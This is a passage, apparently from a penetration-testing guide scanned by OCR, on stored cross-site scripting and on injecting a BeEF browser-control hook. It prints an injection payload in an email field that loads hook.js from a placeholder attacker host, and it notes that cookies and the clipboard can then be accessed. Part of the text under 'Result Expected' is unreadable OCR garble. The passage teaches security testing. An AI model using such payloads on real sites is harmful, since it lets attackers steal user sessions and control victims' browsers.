@@ -1,0 +1,32 @@
+ing a JavaScript hook which communicates to the attacker's
+browser exploitation framework (BeEF)
+« Waiting for the application user to view the vulnerable page
+where the stored input is displayed
+« Control the application user's browser via the BeEF console
+The JavaScript hook can be injected by exploiting the XSS vulnerability
+in the web application.
+Example: BeEF Injection in index2.php:
+aaa@aa.com"><script src=http:/attackersite/hook.js></
+script>
+When the user loads the page index2.php, the script hook,js is execut-
+ed by the browser. It is then possible to access cookies, user screen-
+shot, user clipboard, and launch complex XSS attacks.
+Result Expected
+great Geos ree
+aa
+fit
+9-1-0 eet
+- ee pees Ge
+ed a
+epee | bed ied
+Coro bee
+Pere
+This attack is particularly effective in vulnerable pages that are viewed
+by many users with different privileges.
+File Upload
+If the web application allows file upload, it is important to check if it is
+possible to upload HTML content. For instance, if HTML or TXT files are
+allowed, XSS payload can be injected in the file uploaded. The pen-tes-
+ter should also verify if the file upload allows setting arbitrary MIME
+types.
+Consider the following HTTP
